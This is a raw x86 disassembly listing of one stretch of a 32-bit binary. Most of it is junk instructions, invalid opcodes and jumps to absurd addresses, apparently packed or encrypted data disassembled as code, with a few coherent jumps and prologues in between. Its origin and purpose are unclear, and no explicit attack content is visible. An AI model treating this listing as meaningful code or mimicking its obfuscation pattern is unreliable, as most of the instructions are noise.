  406b67:	mov    DWORD PTR ds:0x4337d3,0x29a7
  406b71:	jmp    0x406d50
  406b76:	cwde   
  406b77:	sahf   
  406b78:	inc    edi
  406b79:	mov    bh,0x41
  406b7b:	ja     0x406be5
  406b7d:	mov    cl,0xc9
  406b7f:	mov    DWORD PTR [ecx],0x52da435f
  406b85:	icebp  
  406b86:	add    bh,BYTE PTR [ebx]
  406b88:	jle    0x406c08
  406b8a:	mov    esp,0x6c7e7e7f
  406b8f:	stos   BYTE PTR es:[edi],al
  406b90:	xchg   bh,ch
  406b92:	inc    eax
  406b93:	test   BYTE PTR [esi+0x50603cce],bl
  406b99:	jmp    0xae23fc5d
  406b9e:	aas    
  406b9f:	in     al,0x6d
  406ba1:	lahf   
  406ba2:	sti    
  406ba3:	loop   0x406b76
  406ba5:	ds addr16 call 0xd25bc2af
  406bac:	xor    DWORD PTR [edi+0x4b6cbb73],edi
  406bb2:	cli    
  406bb3:	xchg   esp,eax
  406bb4:	sub    BYTE PTR [ebp-0x4a],0x66
  406bb8:	adc    esp,esi
  406bba:	lods   al,BYTE PTR ds:[esi]
  406bbb:	mov    ebp,0xaa6f23c2
  406bc0:	rol    BYTE PTR [ebx],1
  406bc2:	rcr    DWORD PTR [edx+0x77e8358c],cl
  406bc8:	addr16 jge 0x406be5
  406bcb:	enter  0xfbc,0xdb
  406bcf:	cdq    
  406bd0:	ja     0x406b55
  406bd2:	cmp    BYTE PTR [ebx-0xb],ah
  406bd5:	mov    ds:0x6e4c6acc,eax
  406bda:	test   DWORD PTR [ecx-0x45e67a13],edi
  406be0:	xchg   ecx,eax
  406be1:	cmp    DWORD PTR [ebx],0x4
  406be4:	rcl    DWORD PTR [edi],0x75
  406be7:	fmul   QWORD PTR [eax]
  406be9:	jmp    0x406b7d
  406beb:	mov    ebx,0x784ddfaf
  406bf0:	inc    edx
  406bf1:	ror    edi,1
  406bf3:	pusha  
  406bf4:	std    
  406bf5:	inc    esp
  406bf6:	mov    eax,ds:0xda25ac96
  406bfb:	pop    edx
  406bfc:	(bad)  
  406bfd:	mov    ds:0x62c68d8c,eax
  406c02:	test   esi,ebx
  406c04:	shl    ebx,0x1e
  406c07:	sub    bl,BYTE PTR [edx]
  406c09:	mov    edi,0x6bc10d26
  406c0e:	or     edi,edx
  406c10:	mov    cl,0xf9
  406c12:	cli    
  406c13:	cmp    ebx,DWORD PTR [eax-0x10a0636d]
  406c19:	sahf   
  406c1a:	xlat   BYTE PTR ds:[ebx]
  406c1b:	data16 adc BYTE PTR [ecx+0x28],ch
  406c1f:	pop    es
  406c20:	sbb    ebp,DWORD PTR [ebp-0x1049817d]
  406c26:	pop    ecx
  406c27:	jns    0x406c18
  406c29:	scas   eax,DWORD PTR es:[edi]
  406c2a:	ins    DWORD PTR es:[edi],dx
  406c2b:	mov    eax,0x6fdca3ac
  406c30:	call   0x5432390d
  406c35:	dec    ecx
  406c36:	loop   0x406c77
  406c38:	add    eax,DWORD PTR [ebx-0x77]
  406c3b:	xacquire xchg DWORD PTR [eax+0x5c],eax
  406c3f:	jg     0x406c74
  406c41:	lds    esi,FWORD PTR [edx]
  406c43:	dec    edi
  406c44:	daa    
  406c45:	test   ch,bh
  406c47:	mov    eax,ds:0x197a5c2d
  406c4c:	inc    esi
  406c4d:	out    dx,eax
  406c4e:	mov    BYTE PTR [esi+0x160eebd0],dl
  406c54:	dec    ebp
  406c55:	test   ch,cl
  406c57:	js     0x406c09
  406c59:	int    0x37
  406c5b:	pop    eax
  406c5c:	xor    DWORD PTR [esi-0x54],ebp
  406c5f:	fldcw  WORD PTR [esi+0xb]
  406c62:	retf   0x2a1b
  406c65:	sar    BYTE PTR [ecx],cl
  406c67:	bound  edi,QWORD PTR [edx+0x20]
  406c6a:	adc    ch,BYTE PTR [ebp+0x28]
  406c6d:	xchg   ebp,eax
  406c6e:	nop
  406c6f:	and    edi,ecx
  406c71:	xor    dl,BYTE PTR [edi]
  406c73:	stos   DWORD PTR es:[edi],eax
  406c74:	mov    ds:0xf7c5a032,eax
  406c79:	cld    
  406c7a:	repz aam 0xa3
  406c7d:	fdivr  st(1),st
  406c7f:	mov    ds:0xfd0e36c4,eax
  406c84:	or     BYTE PTR [edi],dh
  406c86:	ret    0xa9dc
  406c89:	or     eax,0xeb13c4b1
  406c8e:	loop   0x406c9f
  406c90:	jb     0x406c5c
  406c92:	retf   
  406c93:	nop
  406c94:	popa   
  406c95:	jg     0x406c75
  406c97:	mov    esp,0xc96d315b
  406c9c:	leave  
  406c9d:	push   edx
  406c9e:	psrld  mm6,mm7
  406ca1:	int3   
  406ca2:	mov    al,ds:0xb73a3d2
  406ca7:	cwde   
  406ca8:	mov    edi,0x1fd9a14
  406cad:	(bad)  [eax+esi*2]
  406cb0:	jle    0x406c6a
  406cb2:	mov    ch,0x14
  406cb4:	stos   BYTE PTR es:[edi],al
  406cb5:	xor    esp,ebx
  406cb7:	fldenv [ebx]
  406cb9:	lods   al,BYTE PTR ds:[esi]
  406cba:	iret   
  406cbb:	pop    esp
  406cbc:	sub    eax,DWORD PTR [edi]
  406cbe:	sub    eax,0x35c1877c
  406cc3:	sub    DWORD PTR [esp+eax*2-0x370c3946],0x5
  406ccb:	cmp    BYTE PTR [esi],ch
  406ccd:	shr    BYTE PTR [edi],cl
  406ccf:	test   eax,ecx
  406cd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406cd2:	ficom  DWORD PTR [eax]
  406cd4:	into   
  406cd5:	xchg   edx,eax
  406cd6:	mov    gs,WORD PTR [eax-0x390e039a]
  406cdc:	jae    0x406d18
  406cde:	dec    esi
  406cdf:	daa    
  406ce0:	(bad)  
  406ce1:	loopne 0x406cf4
  406ce3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ce4:	xchg   edx,eax
  406ce5:	cmp    BYTE PTR [esi-0x3f],dl
  406ce8:	sbb    eax,ebp
  406cea:	sbb    BYTE PTR [ebp+edx*4+0x3250e932],cl
  406cf1:	call   0x2f77f6da
  406cf6:	sub    eax,0x165adaed
  406cfb:	ror    eax,0xaa
  406cfe:	dec    esi
  406cff:	loopne 0x406d37
  406d01:	test   BYTE PTR [ecx+0x51b8fc71],0x31
  406d08:	out    0x49,eax
  406d0a:	xchg   cl,ah
  406d0c:	xor    eax,0x35b12dee
  406d11:	nop
  406d12:	das    
  406d13:	loop   0x406d45
  406d15:	mov    esp,0xd01e7e3d
  406d1a:	mov    edi,0x6bc66eb8
  406d1f:	jae    0x406cd7
  406d21:	mov    ecx,0xf4f20c20
  406d26:	je     0x406d2a
  406d28:	arpl   WORD PTR [ebx-0x79],ax
  406d2b:	outs   dx,BYTE PTR ds:[esi]
  406d2c:	gs ss sbb al,0xfc
  406d30:	and    eax,0xf044a65c
  406d35:	sar    BYTE PTR [ebp-0x53],0x2
  406d39:	(bad)  
  406d3b:	in     eax,0x4
  406d3d:	sub    eax,DWORD PTR fs:[esi]
  406d40:	or     edx,DWORD PTR [esi+0x71]
  406d43:	lds    ecx,FWORD PTR [ecx-0x50b221ba]
  406d49:	add    al,0x25
  406d4b:	pmaxsw mm7,QWORD PTR [esi+esi*1-0x3e]
  406d50:	xor    ax,cx
  406d53:	mov    ecx,0x3b02
  406d58:	sbb    DWORD PTR ds:0x43382f,0x433713
  406d62:	add    ax,cx
  406d65:	add    DWORD PTR ds:0x433823,0x7d57
  406d6f:	mov    ecx,DWORD PTR [ebp+0x8]
  406d72:	movzx  eax,ax
  406d75:	sbb    DWORD PTR ds:0x433763,0x43370f
  406d7f:	jmp    0x406f5e
  406d84:	cmp    DWORD PTR [ebx],ebp
  406d86:	es fdivrp st(4),st
  406d89:	repz shr DWORD PTR [ecx],0x6c
  406d8d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d8e:	pop    esi
  406d8f:	xor    al,0x24
  406d91:	data16 rcl cl,1
  406d94:	inc    eax
  406d95:	cmp    BYTE PTR [esi+0x7e],bh
  406d98:	mov    esp,0x837e7e7f
  406d9d:	push   eax
  406d9e:	(bad)  
  406d9f:	jmp    0xde6bb74
  406da4:	outs   dx,BYTE PTR ds:[esi]
  406da5:	adc    esi,DWORD PTR [edx+edi*1-0x157bdcc3]
  406dac:	cmc    
  406dad:	ins    BYTE PTR es:[edi],dx
  406dae:	fs lock jle 0x406da7
  406db2:	inc    edx
  406db3:	xor    BYTE PTR [edi+0x7f],al
  406db6:	aas    
  406db7:	push   es
  406db8:	sub    eax,DWORD PTR [ebp+0x3d]
  406dbb:	cmp    al,0x31
  406dbd:	mov    ebx,0x2cc9be4f
  406dc2:	or     dh,BYTE PTR [eax+0x62a87b1]
  406dc8:	pop    ecx
  406dc9:	mov    bl,0x99
  406dcb:	loopne 0x406e27
  406dcd:	pop    esp
  406dce:	jl     0x406e19
  406dd0:	or     ch,bl
  406dd2:	mov    ds,WORD PTR [eax+0x52]
  406dd5:	mov    ebx,0x93164fbb
  406dda:	stc    
  406ddb:	mov    edx,0x5a6880ea
  406de0:	dec    ebx
  406de1:	mov    DWORD PTR [ebp+0x171c122f],0xdddb98ca
  406deb:	repz pop ebx
  406ded:	cmp    cl,BYTE PTR [bx+di]
  406df0:	and    BYTE PTR [ebp-0x1b],ch
  406df3:	or     al,0x47
  406df5:	ja     0x406e4f
  406df7:	jnp    0x406d92
  406df9:	adc    cl,ah
  406dfb:	mov    esi,0x1625db84
  406e00:	sub    eax,0x6459076b
  406e05:	sub    eax,DWORD PTR [esi]
  406e07:	dec    esp
  406e08:	fs out 0x69,eax
  406e0b:	cmc    
  406e0c:	mov    eax,ds:0x35645f9e
  406e11:	jmp    0x406def
  406e13:	test   eax,0xc27aaee8
  406e18:	push   ecx
  406e19:	xchg   ebp,eax
  406e1a:	stos   DWORD PTR es:[edi],eax
  406e1b:	(bad)  
  406e1c:	out    0x4c,eax
  406e1e:	sbb    al,0xa0
  406e20:	jecxz  0x406daf
  406e22:	ds xchg edi,eax
  406e24:	test   al,0x75
  406e26:	stc    
  406e27:	cmp    al,0x43
  406e29:	lock mov cl,0x3c
  406e2c:	sub    esi,ecx
  406e2e:	lds    eax,FWORD PTR [edi-0x24d0c3f1]
  406e34:	shl    BYTE PTR [ebp+0x34],cl
  406e37:	aas    
  406e38:	stc    
  406e39:	inc    ebx
  406e3a:	fist   DWORD PTR [edi+edx*2]
  406e3d:	pop    edi
  406e3e:	test   eax,0x94a44661
  406e43:	xchg   esp,eax
  406e44:	ja     0x406ebc
  406e46:	ret    
  406e47:	inc    eax
  406e48:	stc    
  406e49:	shl    DWORD PTR [ebx-0x3e],1
  406e4c:	mov    dh,0xcf
  406e4e:	(bad)  
  406e4f:	push   0xffffffef
  406e51:	stos   BYTE PTR es:[edi],al
  406e52:	sbb    eax,0x84a3fe9b
  406e57:	gs ins BYTE PTR es:[edi],dx
  406e59:	pop    ds
  406e5a:	lds    esi,FWORD PTR [esi+0x587fe6dc]
  406e60:	sub    al,0xae
  406e62:	adc    eax,0x6b559385
  406e67:	sbb    ecx,DWORD PTR [esi]
  406e69:	in     al,0x8f
  406e6b:	adc    bl,bh
  406e6d:	shr    eax,0x99
  406e70:	add    eax,0x410c207
  406e75:	lods   eax,DWORD PTR ds:[esi]
  406e76:	fsub   DWORD PTR [ebp-0x2451d81e]
  406e7c:	mov    ebp,esi
  406e7e:	out    dx,eax
  406e7f:	shl    DWORD PTR ds:0xff119e52,0xca
  406e86:	xchg   edx,eax
  406e87:	mov    ah,0x40
  406e89:	xor    ch,BYTE PTR [ecx]
  406e8b:	push   eax
  406e8c:	add    eax,0x5686e4cc
  406e91:	into   
  406e92:	into   
  406e93:	sub    BYTE PTR ss:0xbfaa4a85,bh
  406e9a:	(bad)  
  406e9b:	loope  0x406f1b
  406e9d:	cmp    BYTE PTR [edi],bl
  406e9f:	test   ebx,eax
  406ea1:	fisubr WORD PTR [edi+0x7d]
  406ea4:	sub    edi,DWORD PTR [edx]
  406ea6:	aas    
  406ea7:	sbb    al,0x3
  406ea9:	test   BYTE PTR [edi-0x67d44be2],cl
  406eaf:	icebp  
  406eb0:	mov    BYTE PTR [ecx+0x620bc27d],0x33
  406eb7:	mov    ecx,0xf3eabece
  406ebc:	sbb    DWORD PTR [ecx],ebx
  406ebe:	mov    DWORD PTR [eax],esp
  406ec0:	push   ebx
  406ec1:	xor    bl,BYTE PTR [edi]
  406ec3:	adc    al,0xc
  406ec5:	mov    edx,0x4e20fecb
  406eca:	js     0x406e9d
  406ecc:	es jo  0x406ee3
  406ecf:	ror    cl,cl
  406ed1:	xchg   ebp,eax
  406ed2:	push   ecx
  406ed3:	xor    BYTE PTR [eax+0x18],al
  406ed6:	xor    DWORD PTR [ebp-0x62],esi
  406ed9:	mov    DWORD PTR [esi+eiz*8],ebp
  406edc:	pop    ecx
  406edd:	cmp    eax,0x5af64040
  406ee2:	and    edi,edi
  406ee4:	bound  esi,QWORD PTR [ecx]
  406ee6:	jbe    0x406ec5
  406ee8:	sahf   
  406ee9:	push   0xa28c7635
  406eee:	mov    esi,0x3766c47c
  406ef3:	popa   
  406ef4:	das    
  406ef5:	pusha  
  406ef6:	imul   ebx,DWORD PTR [esi-0x3e67b92c],0xc9625a73
  406f00:	enter  0xfcd,0xc9
  406f04:	pop    ebx
  406f05:	inc    ebx
  406f06:	dec    esp
  406f07:	cld    
  406f08:	mov    esi,0x3a7ccb80
  406f0d:	ja     0x406f53
  406f0f:	mov    ?,WORD PTR [edi+0x7d39e7e7]
  406f15:	dec    ebx
  406f16:	inc    edx
  406f17:	cmp    eax,esp
  406f19:	scas   al,BYTE PTR es:[edi]
  406f1a:	outs   dx,BYTE PTR ds:[esi]
  406f1b:	fbld   TBYTE PTR [edx]
  406f1d:	call   0x33bed50
  406f22:	call   0x166506b6
  406f27:	sbb    al,0xb7
  406f29:	mov    ecx,DWORD PTR [esi+0x769800ed]
  406f2f:	dec    esi
  406f30:	in     al,dx
  406f31:	aad    0xec
  406f33:	enter  0xbe06,0x8b
  406f37:	in     al,0xad
  406f39:	push   eax
  406f3a:	add    DWORD PTR [esi],esp
  406f3c:	dec    eax
  406f3d:	rol    BYTE PTR [edx],1
  406f3f:	pop    edx
  406f40:	arpl   WORD PTR [ebp-0x34],dx
  406f43:	xchg   BYTE PTR [edi-0x9],bh
  406f46:	sahf   
  406f47:	jp     0x406ede
  406f49:	dec    esi
  406f4a:	sub    al,0x62
  406f4c:	or     al,0x6
  406f4e:	enter  0x60ae,0x70
  406f52:	fucom  st(7)
  406f54:	push   cs
  406f55:	stc    
  406f56:	mov    bl,0x49
  406f58:	adc    DWORD PTR [esi-0x1d],ebx
  406f5b:	pop    esp
  406f5c:	mov    esp,0x81d0f79c
  406f61:	and    eax,0x43370f
  406f66:	push   ebx
  406f67:	aaa    
  406f68:	inc    ebx
  406f69:	add    BYTE PTR [ebx],ah
  406f6b:	add    DWORD PTR [ebx+0x189084d],ecx
  406f71:	jmp    0x406f7d
  406f76:	xor    DWORD PTR [ebp-0x4],0xe149eb8
  406f7d:	mov    ax,WORD PTR [ebp-0x8]
  406f81:	jmp    0x407160
  406f86:	dec    ebx
  406f87:	rcr    BYTE PTR [ecx],0x72
  406f8a:	mov    cl,0x73
  406f8c:	push   ecx
  406f8d:	loope  0x406f7e
  406f8f:	sahf   
  406f90:	adc    al,BYTE PTR ds:0xab631c80
  406f96:	mov    es,esi
  406f98:	jle    0x407018
  406f9a:	mov    esp,0xa27e7e7f
  406f9f:	and    dh,cl
  406fa1:	jbe    0x406fb1
  406fa3:	imul   edx,DWORD PTR [ebx+ecx*2+0x4c],0xd
  406fa8:	loope  0x406fc0
  406faa:	pop    ebp
  406fab:	adc    edi,edi
  406fad:	pop    ds
  406fae:	and    eax,0xe3fc6875
  406fb3:	push   edi
  406fb4:	ja     0x406fa0
  406fb6:	outs   dx,DWORD PTR ds:[esi]
  406fb7:	xchg   ebp,eax
  406fb8:	cmp    edi,DWORD PTR [esi+0x77]
  406fbb:	mov    dh,BYTE PTR [edx+0x4b]
  406fbe:	pop    edx
  406fbf:	in     al,0x9e
  406fc1:	push   ebx
  406fc2:	mov    ebp,ebx
  406fc4:	dec    ebp
  406fc5:	sub    eax,0x57dc774c
  406fca:	pop    esi
  406fcb:	xchg   esp,eax
  406fcc:	test   eax,0x6f26e887
  406fd1:	xchg   ecx,eax
  406fd2:	ds sbb edi,esi
  406fd5:	sbb    cl,BYTE PTR ds:0x5f960743
  406fdb:	fisttp DWORD PTR [edx-0x56]
  406fde:	mov    WORD PTR [ecx+0x2d],?
  406fe1:	lds    esp,FWORD PTR [ecx-0x17]
  406fe4:	(bad)  
  406fe5:	dec    edx
  406fe6:	add    ebx,DWORD PTR [ebx]
  406fe8:	int3   
  406fe9:	or     DWORD PTR [edi],eax
  406feb:	add    ebp,edi
  406fed:	fistp  WORD PTR [esi-0x6aab1cb8]
  406ff3:	jmp    0xbdab:0xdb7de5d7
  406ffa:	pusha  
  406ffb:	pop    ss
  406ffc:	sbb    DWORD PTR [edi+eax*4-0x6d998df6],ecx
  407003:	loopne 0x406fac
  407005:	or     BYTE PTR [edi-0x68],al
  407008:	pushf  
  407009:	loope  0x406faf
  40700b:	push   esp
  40700c:	dec    edx
  40700d:	push   edx
  40700e:	clc    
  40700f:	xchg   edi,eax
  407010:	stos   BYTE PTR es:[edi],al
  407011:	(bad)  
  407012:	jno    0x40700c
  407014:	outs   dx,DWORD PTR ds:[esi]
  407015:	and    DWORD PTR [ecx+esi*1+0x5],esp
  407019:	inc    ebx
  40701a:	add    edi,DWORD PTR [ebx+0x13292eae]
  407020:	fucomp st(0)
  407022:	xchg   edx,eax
  407023:	mov    bh,0x6c
  407025:	mov    eax,ds:0xf9eb0962
  40702a:	dec    esp
  40702b:	mov    dh,0xb3
  40702d:	inc    esi
  40702e:	int    0x17
  407030:	cmp    eax,0xb412b1ce
  407035:	dec    ebp
  407036:	les    edi,FWORD PTR [edi+0x5e95aa38]
  40703c:	(bad)  
  40703d:	pand   mm5,QWORD PTR [edx]
  407040:	cmp    BYTE PTR [esi],al
  407042:	pop    ss
  407043:	test   DWORD PTR [ecx+0x61],0x110fe3f5
  40704a:	int    0xb4
  40704c:	lea    esp,[eax+0x50124947]
  407052:	push   0xffffffe7
  407054:	jb     0x407033
  407056:	int3   
  407057:	fadd   DWORD PTR ds:0xa0495ab1
  40705d:	stos   BYTE PTR es:[edi],al
  40705e:	dec    ecx
  40705f:	std    
  407060:	or     cl,BYTE PTR [ecx-0x4b]
  407063:	cs (bad) 
  407065:	loopne 0x4070af
  407067:	je     0x407019
  407069:	jp     0x406ff5
  40706b:	xchg   edx,eax
  40706c:	pushf  
  40706d:	outs   dx,DWORD PTR ds:[esi]
  40706e:	lahf   
  40706f:	dec    edx
  407070:	mov    ah,0x5a
  407072:	jbe    0x407018
  407074:	in     al,dx
  407075:	dec    eax
  407076:	jle    0x4070da
  407078:	dec    ecx
  407079:	mov    al,0x2a
  40707b:	mov    bh,0xe8
  40707d:	and    BYTE PTR [ebp-0x1b],bl
  407080:	cli    
  407081:	xchg   DWORD PTR [eax-0x37],edi
  407084:	call   0xe952a665
  407089:	mul    dh
  40708b:	add    esp,DWORD PTR ds:0x53705470
  407091:	adc    esp,DWORD PTR [edx-0x28f629b8]
  407097:	or     dl,BYTE PTR [ebp*1-0x6c11ca2c]
  40709e:	mov    ah,0x6d
  4070a0:	mov    edi,0x9d8ffba3
  4070a5:	aad    0xd4
  4070a7:	jp     0x4070df
  4070a9:	iret   
  4070aa:	gs popf 
  4070ac:	cmc    
  4070ad:	fimul  WORD PTR [edx]
  4070af:	sbb    BYTE PTR [edx-0x50],bh
  4070b2:	sub    eax,0x1f179b17
  4070b7:	pop    eax
  4070b8:	mov    bh,BYTE PTR [ebx]
  4070ba:	sbb    ebp,eax
  4070bc:	cmp    DWORD PTR [ecx],esp
  4070be:	fnstcw WORD PTR [eax+0x29]
  4070c1:	in     eax,dx
  4070c2:	xchg   ebp,eax
  4070c3:	push   ebx
  4070c4:	out    dx,al
  4070c5:	and    eax,0x843e860f
  4070ca:	aas    
  4070cb:	inc    edx
  4070cc:	and    bl,bh
  4070ce:	xchg   ecx,eax
  4070cf:	popa   
  4070d0:	ret    0x636
  4070d3:	call   DWORD PTR [ebx+ebx*8+0x4e43a8cc]
  4070da:	or     eax,0xeca9cdbd
  4070df:	jle    0x407091
  4070e1:	mov    bl,BYTE PTR [esi-0x3a]
  4070e4:	fadd   DWORD PTR ds:0xbd1754c0
  4070ea:	sbb    ebp,esp
  4070ec:	(bad)  
  4070ed:	call   FWORD PTR [ecx+0x5a47893]
  4070f3:	or     al,0x34
  4070f5:	push   0x80e4d53d
  4070fa:	into   
  4070fb:	sbb    eax,0x9ffda8cb
  407100:	xor    esp,DWORD PTR [ebx-0x3d]
  407103:	call   0x9da2c800
  407108:	sbb    edx,DWORD PTR [edx]
  40710a:	pop    ss
  40710b:	mov    edi,0x1c81bce3
  407110:	push   esp
  407111:	mov    ds:0xb0f88a1,al
  407116:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407117:	mov    al,ds:0xf0219ff9
  40711c:	push   ebx
  40711d:	xor    esi,edi
  40711f:	push   edx
  407120:	sbb    al,0x2a
  407122:	sub    dh,0xe0
  407125:	inc    eax
  407126:	sub    eax,0x2a050ffb
  40712b:	push   DWORD PTR [edi+0x29]
  40712e:	inc    ebx
  40712f:	adc    ebx,esi
  407131:	push   ebp
  407132:	inc    edx
  407133:	inc    edi
  407134:	loop   0x4070ec
  407136:	cmp    BYTE PTR [ebx+0x1c67f339],cl
  40713c:	mov    bh,0x60
  40713e:	push   eax
  40713f:	packsswb mm5,QWORD PTR [edi+ebp*8+0x276ec9e3]
  407147:	pop    ss
  407148:	pop    ecx
  407149:	or     esi,DWORD PTR [edx+0x12]
  40714c:	mov    bh,0x47
  40714e:	popf   
  40714f:	cmp    eax,0xc52886cd
  407154:	mov    dl,0xcf
  407156:	in     al,0xa
  407158:	test   DWORD PTR [esi-0x4c],esi
  40715b:	push   esp
  40715c:	lods   eax,DWORD PTR ds:[esi]
  40715d:	jmp    0x76402a14
  407162:	or     al,ch
  407164:	jmp    0x407167
  407166:	add    BYTE PTR [eax],al
  407168:	test   eax,eax
  40716a:	jmp    0x407349
  40716f:	and    eax,0xb1edb090
  407174:	in     eax,dx
  407175:	popa   
  407176:	push   eax
  407177:	retf   
  407178:	xchg   BYTE PTR [ebx-0x74],dh
  40717b:	adc    cl,BYTE PTR [ebp-0x3b33e8bc]
  407181:	jle    0x407201
  407183:	mov    esp,0x397e7e7f
  407188:	jmp    0x951e:0xa662c19e
  40718f:	in     eax,dx
  407190:	mov    ebx,0xbd82820e
  407195:	scas   al,BYTE PTR es:[edi]
  407196:	ds aaa 
  407198:	lods   al,BYTE PTR ds:[esi]
  407199:	mov    dh,0xd8
  40719b:	les    edi,FWORD PTR [ebx+0x70]
  40719e:	jl     0x40714b
  4071a0:	inc    esi
  4071a1:	test   BYTE PTR [ebp+0x68],ch
  4071a4:	aam    0x0
  4071a6:	mov    WORD PTR [ebx],es
  4071a8:	mov    gs,WORD PTR [ecx+eiz*2-0x3b96e531]
  4071af:	ret    
  4071b0:	shl    DWORD PTR [edx-0x68],0x39
  4071b4:	in     al,dx
  4071b5:	into   
  4071b6:	sbb    ch,cl
  4071b8:	push   esp
  4071b9:	fsubr  QWORD PTR [ebx]
  4071bb:	aad    0xa7
  4071bd:	in     al,dx
  4071be:	loop   0x4071a3
  4071c0:	cli    
  4071c1:	pushf  
  4071c2:	retf   0xdb5b
  4071c5:	sbb    al,0xb1
  4071c7:	bound  esp,QWORD PTR [eax+0x46266bdb]
  4071cd:	jae    0x4071a4
  4071cf:	lahf   
  4071d0:	push   esi
  4071d1:	lea    eax,[ebp+0x5a]
  4071d4:	dec    esp
  4071d5:	(bad)  
  4071d7:	mov    ds:0x4fa8077,al
  4071dc:	and    eax,0xcd1ccaff
  4071e1:	or     DWORD PTR [ebp+edi*1-0x51],ebx
  4071e5:	xchg   BYTE PTR [eax+esi*2],bh
  4071e8:	or     al,0xec
  4071ea:	das    
  4071eb:	ds add edx,ebx
  4071ee:	xchg   ecx,eax
  4071ef:	lods   al,BYTE PTR ds:[esi]
  4071f0:	jb     0x407269
  4071f2:	inc    eax
  4071f3:	xlat   BYTE PTR ds:[ebx]
  4071f4:	cwde   
  4071f5:	lahf   
  4071f6:	fdivr  QWORD PTR ds:0x83e50b30
  4071fc:	and    ebp,edx
  4071fe:	pop    esp
  4071ff:	data16 ja 0x407249
  407202:	sbb    ah,0xa2
  407205:	sub    esi,DWORD PTR ds:0xf6ec77e6
  40720b:	mov    ds:0xfcda6c25,al
  407210:	fldcw  WORD PTR [edi]
  407212:	xor    ebx,DWORD PTR [edx+0x57c902eb]
  407218:	sub    ah,BYTE PTR [esi+0x11]
  40721b:	push   esi
  40721c:	into   
  40721d:	dec    ebx
  40721e:	inc    eax
  40721f:	clc    
  407220:	lds    esp,FWORD PTR [edx]
  407222:	mov    ch,0xd5
  407224:	pop    esi
  407225:	push   ebp
  407226:	cmp    DWORD PTR [eax],edi
  407228:	mov    cs,edx
  40722a:	sub    ah,BYTE PTR [ecx+0x5d]
  40722d:	sub    eax,0xb026f2e
  407232:	sub    dh,bh
  407234:	pop    eax
  407235:	push   ecx
  407236:	xchg   ebp,eax
  407237:	pop    eax
  407238:	add    eax,0x518fce66
  40723d:	out    0xc3,eax
  40723f:	out    0xe3,al
  407241:	outs   dx,DWORD PTR ds:[esi]
  407242:	inc    ebp
  407243:	or     al,0xa3
  407245:	data16 loopne 0x407273
  407248:	test   ebp,esi
  40724a:	enter  0xb700,0x23
  40724e:	clc    
  40724f:	(bad)  
  407250:	xchg   esp,eax
  407251:	iret   
  407252:	push   eax
  407253:	sar    DWORD PTR [ecx-0x6f],1
  407256:	mov    bl,0x53
  407258:	(bad)
  40725c:	or     BYTE PTR [edx],ch
  40725e:	stos   DWORD PTR es:[edi],eax
  40725f:	sbb    BYTE PTR [esp+edi*4],0x37
  407263:	in     al,0x8a
  407265:	dec    eax
  407266:	mov    edi,DWORD PTR [esi-0x73995ba6]
  40726c:	call   0xf208f74c
  407271:	mov    ah,0xac
  407273:	lds    edi,FWORD PTR [eax]
  407275:	push   0x85b5c598
  40727a:	xchg   edx,eax
  40727b:	xchg   esi,eax
  40727c:	pop    ss
  40727d:	fidiv  DWORD PTR [eax-0xda497d8]
  407284:	mov    BYTE PTR [ebp+0x37671d03],al
  40728a:	xchg   ebp,eax
  40728b:	jl     0x407279
  40728d:	outs   dx,BYTE PTR ds:[esi]
  40728e:	push   ebx
  40728f:	xor    eax,0xfbb2f5b6
  407294:	pusha  
  407295:	dec    ecx
  407296:	mov    edi,0x5381811c
  40729b:	cmc    
  40729c:	xchg   ebx,eax
  40729d:	push   0x26
  40729f:	(bad)  
  4072a0:	into   
  4072a1:	sbb    DWORD PTR [eax],edi
  4072a3:	in     al,dx
  4072a4:	cmp    ah,BYTE PTR [edi+0x7419c9eb]
  4072aa:	pandn  mm4,QWORD PTR [ebx]
  4072ad:	std    
  4072ae:	mov    WORD PTR [eax],cs
  4072b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072b2:	stc    
  4072b3:	(bad)  
  4072b4:	shl    DWORD PTR ds:0x15d62b77,cl
  4072ba:	mov    ch,BYTE PTR [ebx+0xcfd9594]
  4072c0:	cwde   
  4072c1:	addr16 push esi
  4072c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4072c4:	addr16 xor eax,0x4957a268
  4072ca:	or     ah,BYTE PTR [edi-0x2a]
  4072cd:	cs es jle 0x407278
  4072d1:	pop    ecx
  4072d2:	ret    0x540c
  4072d5:	sar    dl,0x73
  4072d8:	cmp    al,BYTE PTR [ebx]
  4072da:	push   esi
  4072db:	rcl    DWORD PTR [ecx],1
  4072dd:	mov    edi,0xbc61f2b2
  4072e2:	or     al,0x44
  4072e4:	test   dh,bl
  4072e6:	out    0xaa,eax
  4072e8:	inc    edx
  4072e9:	ins    DWORD PTR es:[edi],dx
  4072ea:	sbb    eax,0x8e4c6c06
  4072ef:	lahf   
  4072f0:	call   0xdf23e6b8
  4072f5:	cdq    
  4072f6:	dec    ebp
  4072f7:	mov    edx,0xb331fd18
  4072fc:	clc    
  4072fd:	xor    esi,DWORD PTR [esp+edx*4+0x1cb7a606]
  407304:	int3   
  407305:	pusha  
  407306:	lods   al,BYTE PTR ds:[esi]
  407307:	pushf  
  407308:	mov    esi,0xf5a1ef4b
  40730d:	out    dx,al
  40730e:	pop    ds
  40730f:	jbe    0x4072ad
  407311:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407312:	bound  ebp,QWORD PTR [eax-0x60]
  407315:	aas    
  407316:	mov    ch,BYTE PTR [esi+0x0]
  407319:	data16 lahf 
  40731b:	fisttp QWORD PTR [ebp+esi*4+0x68]
  40731f:	or     al,ch
  407321:	loopne 0x40732e
  407323:	int3   
  407324:	fs mov ebp,0x58443f85
  40732a:	mov    eax,0xd61bc1af
  40732f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407330:	push   ebp
  407331:	lock mov edx,0x7c833d3f
  407337:	inc    edx
  407338:	xor    DWORD PTR [edi+0x42],0xd47bbd6a
  40733f:	mov    bh,0x79
  407341:	mov    esi,0x9ac74f25
  407346:	(bad)  
  407347:	mov    cl,0x1a
  407349:	je     0x406f76
  40734f:	leave  
  407350:	ret    0x4
  407353:	push   ebp
  407354:	mov    ebp,esp
  407356:	sub    esp,0x2c
  407359:	and    DWORD PTR ds:0x433757,0x5787
  407363:	mov    DWORD PTR [ebp-0x8],0xf89c8532
  40736a:	mov    eax,ds:0x43382b
